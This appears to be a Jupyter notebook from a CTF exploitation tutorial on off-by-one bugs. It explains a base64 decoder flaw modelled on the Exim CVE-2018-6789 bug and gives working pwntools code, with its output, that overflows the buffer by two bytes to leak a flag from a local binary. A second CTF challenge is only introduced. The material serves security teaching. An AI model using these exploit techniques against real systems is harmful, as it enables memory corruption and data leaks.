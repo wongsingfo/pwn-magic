{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Off-By-One Attack\n",
    "\n",
    "The program writes one more byte than what the buffer can hold."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Example: decoder\n",
    "\n",
    "Source: 0th-PKU-Geek-Game, [CVE-2018-6789](https://github.com/Exim/exim/commit/cf3cd306062a08969c41a1cdd32c6855f1abecf1)\n",
    "\n",
    "References: \n",
    "\n",
    "- https://github.com/beraphin/CVE-2018-6789\n",
    "- https://github.com/martinclauss/exim-rce-cve-2018-6789\n",
    "- https://devco.re/blog/2018/03/06/exim-off-by-one-RCE-exploiting-CVE-2018-6789-en/\n",
    "- https://straightblast.medium.com/my-poc-walk-through-for-cve-2018-6789-2e402e4ff588\n",
    "\n",
    "Vulnerability: \n",
    "\n",
    "```c\n",
    "void __cdecl b64decode(const char *src, int src_len, uint8_t *dst, int *dst_len, int max_len) \n",
    "{\n",
    "    if ( max_len <= 3 * (src_len / 4) )           // not a safe check\n",
    "        return;\n",
    "    ...\n",
    "}\n",
    "```\n",
    "\n",
    "The code assumes that the base64-encoded message length is alway a multiple of 4. If we craft a invalid base64 message with a length of 4n+3, we can control 2 bytes off the buffer. \n",
    "\n",
    "In this problem, the buffer size `max_len` is 700. We can craft a message with length 935 and control the content of `dst[699..700]`. The `dst[700]` is the lowest byte of `dst_len`. We then change `dst_len` from 700 (0x2bc) to 767 (0x2ff) so the program prints the flag that resides in `dst[700..767]`."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[*] '/ctf/work/off-by-one/decoder'\n",
      "    Arch:     amd64-64-little\n",
      "    RELRO:    Partial RELRO\n",
      "    Stack:    No canary found\n",
      "    NX:       NX enabled\n",
      "    PIE:      PIE enabled\n"
     ]
    }
   ],
   "source": [
    "bin_filename = './decoder'\n",
    "from pwn import *\n",
    "from pwnlib import gdb, shellcraft\n",
    "\n",
    "context.terminal = ['tmux', 'new-window']\n",
    "context.arch = 'amd64'\n",
    "elf = ELF(bin_filename)\n",
    "\n",
    "!echo 'flag{hello}' > flag.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "off='Yf8='\n"
     ]
    }
   ],
   "source": [
    "payload = b64e(b'a' * 699)\n",
    "off = b64e(b'a\\xff')\n",
    "print(f'{off=}')\n",
    "payload += off[:3]\n",
    "\n",
    "def exploit(io):\n",
    "    io.recvuntil(b'guess flag (base64):')\n",
    "    io.sendline(payload)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Starting local process './decoder'\n",
      "[+] Starting local process './decoder': pid 8836\n",
      "[x] Receiving all data\n",
      "[x] Receiving all data: 1B\n",
      "[*] Process './decoder' stopped with exit code 0 (pid 8836)\n",
      "[x] Receiving all data: 790B\n",
      "[+] Receiving all data: Done (790B)\n",
      "b' This is not the flag:\\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xff\\x02\\x00\\x00flag{hello}\\n\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    }
   ],
   "source": [
    "io = process(bin_filename)\n",
    "try:\n",
    "    exploit(io)\n",
    "    print(io.recvall())\n",
    "    io.poll(block=True)\n",
    "except Exception as e:\n",
    "    io.kill()\n",
    "    raise e"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "tags": []
   },
   "source": [
    "## Example: b00ks\n",
    "\n",
    "Source: Asis CTF 2016 \n",
    "\n",
    "Vulnerability: The function `readline_off_by_one(char* data, int len)` does not handle the corner case correctly. If the intput line is longer than `len` bytes, the `data[len]` will be set to `\\0`."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
